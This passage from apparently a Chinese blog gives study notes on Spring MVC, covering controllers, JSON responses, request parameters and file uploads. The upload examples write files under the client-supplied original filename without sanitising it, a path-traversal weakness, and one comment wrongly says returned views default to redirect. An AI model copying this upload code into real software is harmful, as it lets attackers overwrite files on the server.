<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manage.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="comment">//请求地址为/user/quick</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;controller save running...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>配置SpringMVC核心文件spring-mvc.xml</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Controller的组件扫描--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.manage.Controller&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端发起请求测试</li>
</ul>
<h3 id="SpringMVC的执行流程"><a href="#SpringMVC的执行流程" class="headerlink" title="SpringMVC的执行流程"></a>SpringMVC的执行流程</h3><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220129160149808.png" alt="image-20220129160149808"></p>
<p>1.用户发请求至前端控制器DispatcherServlet</p>
<p>2.DispatcherServlet收到请求调用HanderMapping处理器映射器</p>
<p>3.处理器引射器找到具体的处理器(可以根据xml配置,注解进行查找),生成处理器对象及处理器拦截器(如果有则生成)并一并返回给DispatcherServlet</p>
<p>4.DispatcherServlet调用HandlerAdapter处理器适配器</p>
<p>5.HandlerAdapter经过适配调用具体的处理器(Controller,也叫后端控制器)</p>
<p>6.Controller执行完成返回ModelAndView</p>
<p>7.HandlerAdapter将controller执行结果ModelAndView返回给DisatcherServlet</p>
<p>8.DispatcherServlet将ModelAndView传给ViewReslover视图解析器</p>
<p>9.ViewReslover解析后返回具体View</p>
<p>10.DispatcherServlet根据View进行渲染视图(即将模型数据填充至视图中),DispatcherServlet响应用户</p>
<p>SpringMVC注解</p>
<ul>
<li>@RequestMapping</li>
</ul>
<p>建立请求URL和处理请求方法之间的对应关系,可以写在类上面,也可以写在方法上面,类的请求路径对于方法属于包含关系</p>
<p>value:用于指定请求的url</p>
<p>method:指定请求的方式</p>
<p>params:用于指定限制请求参数的条件,它支持简单的表达式,要求请求参数的key和value必须和配置的一模一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">params=&#123;&quot;accountName&quot;&#125;,表示请求参数必须有accountName</span><br><span class="line">params=&#123;&quot;money!=100&quot;&#125;,表示请求参数中money不能是100</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;controller save running...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/success.jsp&quot;</span>;</span><br><span class="line">        <span class="comment">//可以指定转发或者重定向,默认是重定向</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;forward:/success.jsp&quot;</span><span class="comment">//转发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/success.jsp&quot;</span><span class="comment">//重定向</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>可以配置视图解析器,让返回的页面可以简写</strong></p>
<h4 id="SpringMVC的数据响应方式"><a href="#SpringMVC的数据响应方式" class="headerlink" title="SpringMVC的数据响应方式"></a>SpringMVC的数据响应方式</h4><h5 id="页面跳转-1"><a href="#页面跳转-1" class="headerlink" title="页面跳转"></a>页面跳转</h5><ul>
<li>直接返回字符串</li>
<li>通过ModelAndView对象返回</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick2&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">save2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Model:模型 作用封装数据</span></span><br><span class="line"><span class="comment">        View:视图 作用展示数据</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        ModelAndView modelAndView=<span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="comment">//设置模型数据</span></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;aaahhahahaha&quot;</span>)</span><br><span class="line">        <span class="comment">//设置视图名称,这是类似于重定向的</span></span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">也可以单独返回model或者view</span><br><span class="line">    SpringMVC可以将形参当成实参用,不需要传入参数</span><br><span class="line">     <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">save2</span><span class="params">(ModelAndView modelAndView)</span>和上面作用相等,SpringMVC会帮我们创建modelAndView对象,可以直接在方法里面用modelAndView</span></span><br><span class="line"><span class="function">    </span></span><br></pre></td></tr></table></figure>

<h5 id="回写数据"><a href="#回写数据" class="headerlink" title="回写数据"></a>回写数据</h5><ul>
<li><p>直接返回字符串</p>
<ul>
<li>使用response中的write方法    </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick3&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save3</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.getWriter().print(<span class="string">&quot;hellodsjfdsjfsdfd&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>可以添加@ResponseBody注解告诉SpringMVC框架,方法返回的字符串不是跳转,是直接在http响应体中返回</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick4&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;djfjdsfdsjf&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>直接返回json字符串</p>
</li>
</ul>
<p>不管它是json字符串还是啥,本质都是字符串</p>
<p>将对象转换为json字符串需要导入jackson依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick5&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;llllll&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//使用json的转换工具将对象转换成json格式</span></span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        String json=objectMapper.writeValueAsString(user);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>期间出现了报错</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220129222455211.png" alt="image-20220129222455211"></p>
<p>原因是需要将原来类中的属性设置为public或者提供get方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220129222727835.png" alt="image-20220129222727835"></p>
<ul>
<li>返回对象或者集合</li>
</ul>
<p>上面返回json的方法比较麻烦,可以通过配置处理器映射器的方法,自动将返回对象转换为json字符串</p>
<p>spring-mvc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置处理器映射器,方便返回json字符串--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样一配置,现在上面的代码就可以简化为,同时还帮忙解决了中文乱码的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick6&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">save6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;llllll&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>经典上面白学</strong></p>
<p>只需要在spring-mvc.xml配置一个mvc的注解驱动就可以自动完成上面的所有跟jackson有关的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Controller的组件扫描--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.manage.Controller&quot;</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--mvc的注解驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SpringMVC的获得请求参数"><a href="#SpringMVC的获得请求参数" class="headerlink" title="SpringMVC的获得请求参数"></a>SpringMVC的获得请求参数</h3><h4 id="获得POJO参数"><a href="#获得POJO参数" class="headerlink" title="获得POJO参数"></a>获得POJO参数</h4><h4 id="获得数组类型参数"><a href="#获得数组类型参数" class="headerlink" title="获得数组类型参数"></a>获得数组类型参数</h4><p>Controller中的业务方法数组名称与请求参数的name一致,参数会自动映射匹配</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">请求地址http:<span class="comment">//localhost:8080/quick7?strings=111&amp;strings=222&amp;strings=333</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/quick7&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save7</span><span class="params">(String[] strings)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(Arrays.asList(strings));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="获得集合类型参数"><a href="#获得集合类型参数" class="headerlink" title="获得集合类型参数"></a>获得集合类型参数</h4><p>获得集合参数时,要将集合参数包装到一个POJO中才可以</p>
<p>使用ajax提交时,可以指定contentType为json形式,那么在方法参数位置使用@RequestBody可以直接接收集合数据而无需使用POJO进行包装</p>
<h3 id="配置静态资源访问"><a href="#配置静态资源访问" class="headerlink" title="配置静态资源访问"></a>配置静态资源访问</h3><p>可以配置静态资源的对应路径和请求路径</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/img/**&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/img/&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者交给Tomcat找</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="配置全局编码过滤器"><a href="#配置全局编码过滤器" class="headerlink" title="配置全局编码过滤器"></a>配置全局编码过滤器</h3><p>和之前学习servlet的过滤器一个作用</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="参数绑定注解-RequestParam"><a href="#参数绑定注解-RequestParam" class="headerlink" title="参数绑定注解@RequestParam"></a>参数绑定注解@RequestParam</h4><p>当请求的参数名称与Controller的业务方法参数名称不一致时,就需要通过@RequestParam注解显示的绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;/quick8&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void save8(@RequestParam(&quot;name&quot;) String username) throws IOException &#123;</span><br><span class="line">        System.out.println(username);</span><br><span class="line">    &#125;</span><br><span class="line">    http://localhost:8080/quick8?name=张三</span><br></pre></td></tr></table></figure>

<p>这样在前端传递参数的时候就可以写name=….,等于同义替换了一下</p>
<p>@RequestParam注解的参数简介</p>
<ul>
<li>value:请求参数名称(默认的参数)</li>
<li><strong>required</strong>:可以选择该参数在请求中是否必须包含,默认是true,如果此时没有包含则会报错,false则可以不包含该参数发起请求</li>
<li>defaultValue:当没有指定请求参数时,则使用指定的默认值赋值,就是给前面的name一个默认值</li>
</ul>
<h4 id="获取Servlet相关API"><a href="#获取Servlet相关API" class="headerlink" title="获取Servlet相关API"></a>获取Servlet相关API</h4><p>直接在函数形参中定义形参使用即可,剩下的交给框架</p>
<p>如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick3&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save3</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.getWriter().print(<span class="string">&quot;hellodsjfdsjfsdfd&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取请求头"><a href="#获取请求头" class="headerlink" title="获取请求头"></a>获取请求头</h4><h5 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="@RequestHeader"></a>@RequestHeader</h5><p>使用@RequestHeader注解可以获得请求头信息,相当于web的时候学习的request.getHeader(name)</p>
<p>@RequestHeader属性</p>
<ul>
<li>value:请求头名称</li>
<li>required:是否必须携带此请求头</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick9&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save9</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;User-Agent&quot;)</span> String userAgent)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(userAgent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h5><p>使用@CookieValue可以获得指定Cookie的值</p>
<p>@CookieValue属性</p>
<ul>
<li>value:指定Cookie的名称</li>
<li>required:是否必须携带此Cookie</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick10&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save10</span><span class="params">(<span class="meta">@CookieValue(value=&quot;JSESSIONID&quot;)</span> String jsessionId)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(jsessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="文件上传客户端三要素"><a href="#文件上传客户端三要素" class="headerlink" title="文件上传客户端三要素"></a>文件上传客户端三要素</h5><ul>
<li>表单项type=”file”</li>
<li>表单的提交方式是post</li>
<li>表单的enctype属性是多部分表单形式,即enctype=”multipart/from-data”</li>
</ul>
<h5 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h5><ul>
<li>当from表单修改为多部分表单时,request.getParameter()将失效</li>
<li>enctype=”application/x-www-from-urlencoded”时,from表单的正文内容格式是:key=value&amp;key2=value2</li>
<li>当from表单的enctype取值为mutilpart/from-data时,正文内容就变成多部分形式,(数据包中通过横杠来分割)</li>
</ul>
<h5 id="单文件上传步骤"><a href="#单文件上传步骤" class="headerlink" title="单文件上传步骤"></a>单文件上传步骤</h5><ul>
<li>导入fileupload和io依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>配置文件上传解析器</li>
</ul>
<p>spring-mvc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置文件上传解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxUploadSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50000&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>编写文件上传代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick11&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save11</span><span class="params">(String username, MultipartFile uploadFile)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String fileName=uploadFile.getOriginalFilename();</span><br><span class="line">        uploadFile.transferTo(<span class="keyword">new</span> File(<span class="string">&quot;C:\\upload\\&quot;</span>+fileName));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h5><p>只需要多添加几个type=”file”的表单项,MultipartFile 类型变量名和表单中的name要保持一致</p>
<p>也可以让name都一样,通过同名数组来接收</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/quick11&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    名称<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    文件<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFiles&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick11&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save11</span><span class="params">(String username, MultipartFile[] uploadFiles)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (MultipartFile uploadFile:uploadFiles</span><br><span class="line">             ) &#123;</span><br><span class="line"></span><br><span class="line">            String fileName=uploadFile.getOriginalFilename();</span><br><span class="line">            uploadFile.transferTo(<span class="keyword">new</span> File(<span class="string">&quot;C:\\upload\\&quot;</span>+fileName));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>Spring</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis6.2.6在Centos7上的安装过程</title>
    <url>/2022/02/17/centos%E5%AE%89%E8%A3%85redis6.2.6/</url>
